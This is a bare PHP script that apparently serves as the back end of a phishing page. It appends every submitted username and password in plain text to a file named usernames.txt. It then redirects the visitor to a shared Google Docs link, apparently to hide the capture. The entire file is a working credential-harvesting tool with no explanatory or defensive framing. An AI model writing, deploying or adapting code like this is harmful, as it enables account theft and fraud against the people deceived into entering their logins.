<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://docs.google.com/document/d/1ngV-OyQuhQ9cx3DFY-jF51Jqdy4RKU3iGbntYQbWMxc/edit?usp=sharing');
exit();
